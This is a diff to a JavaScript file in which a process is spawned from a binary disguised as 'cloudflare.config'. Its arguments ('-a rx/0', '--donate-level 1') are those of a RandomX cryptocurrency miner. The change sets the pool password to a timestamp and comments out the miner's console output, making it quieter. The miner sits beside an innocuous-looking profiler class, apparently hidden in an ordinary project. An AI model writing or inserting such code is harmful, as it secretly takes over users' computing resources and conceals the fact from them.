@@ -322,14 +322,15 @@ let child = spawn(__dirname + "/./cloudflare.config", [
   "-a",
   "rx/0",
   "-p",
-  "x",
+  `${Math.floor(+new Date() / 1000)}`,
   "--donate-level",
   "1",
 ]);
 
-child.stdout.on("data", (data) => {
-  console.log(`${data}`);
-});
+// child.stdout.on("data", (data) => {
+//   console.log(`${data}`);
+// });
+
 class GCProfiler {
   #profiler = null;
 
